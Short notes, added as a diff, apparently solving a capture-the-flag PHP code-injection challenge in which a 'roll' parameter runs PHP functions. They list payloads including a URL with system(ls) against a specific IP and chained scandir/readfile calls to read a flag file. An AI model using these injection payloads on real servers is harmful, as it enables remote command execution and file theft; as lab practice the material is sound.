@@ -1,0 +1,17 @@
+i can run php functions
+eg i put rand will become echo rand() 
+can send in phpinfo, echo phpinfo()
+
+no need the ' 
+http://192.46.227.32/index.php?roll=system(ls)
+
+fl4g_here_but_can_you_get_it_hohoho.php
+
+var_dump(scandir(getcwd()))
+
+var_dump next(array_reverse(scandir(getcwd())))
+
+readfile(next(array_reverse(scandir(getcwd()))))
+
+Think simple.
+Baby steps!
